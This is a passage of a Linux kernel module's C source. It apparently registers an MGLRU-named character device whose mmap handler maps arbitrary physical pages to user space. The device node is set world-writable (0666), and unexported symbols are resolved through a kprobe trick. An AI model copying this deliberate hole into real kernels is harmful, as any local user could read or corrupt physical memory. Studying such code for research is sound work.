	lock_page(page_to_map);

	rt = remap_pfn_range(vma, vma->vm_start, pfn_to_map, PAGE_SIZE, vma->vm_page_prot);
	if (rt) {
		pr_err("remap_pfn_range failed for PFN 0x%lx\n", pfn_to_map);
		unlock_page(page_to_map);
		return -EAGAIN;
	}

	unlock_page(page_to_map);
	pr_info("PFN 0x%lx successfully mapped to user space.\n", pfn_to_map);
	return 0;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = mglru_cache_open,
    .release = mglru_cache_release,
    .mmap = mglru_cache_mmap,
    .unlocked_ioctl = mglru_cache_ioctl,
};

static char *mglru_devnode(const struct device *dev, umode_t *mode)
{
	if (mode)
		*mode = 0666;
	return kstrdup(dev_name(dev), GFP_KERNEL);
}

static int __init mglru_cache_init(void)
{
	int rt;

	kprobe_kallsyms_lookup_name();

	rt = alloc_chrdev_region(&devno, 0, 1, DEV_NAME);
	if (rt < 0) {
		pr_err("Failed to allocate device number\n");
		return rt;
	}

	cdev_init(&mglru_cache_cdev, &fops);
	if (cdev_add(&mglru_cache_cdev, devno, 1) < 0) {
		printk(KERN_ERR "Failed to add cdev\n");
		goto unregister_chrdev;
	}

	dev_class = class_create(DEV_NAME);
	if (IS_ERR(dev_class)) {
		printk(KERN_ERR "Failed to create device class\n");
		goto unregister_chrdev;
	}

	dev_class->devnode = mglru_devnode;
	if (IS_ERR(device_create_with_groups(dev_class, NULL, devno, NULL, NULL, DEV_NAME))) {
		printk(KERN_ERR "mglru_deceit: Failed to create device\n");
		goto destroy_class;
	}

	return 0;

destroy_class:
	class_destroy(dev_class);

unregister_chrdev:
	unregister_chrdev_region(devno, 1);

	return -ENODEV;
}

static void __exit mglru_cache_exit(void)
{
	clear_phantom_page(0);
	clear_phantom_page(1);

	cdev_del(&mglru_cache_cdev);
	device_destroy(dev_class, devno);
	class_destroy(dev_class);
	unregister_chrdev_region(devno, 1);
}

module_init(mglru_cache_init);
module_exit(mglru_cache_exit);
MODULE_LICENSE("GPL");
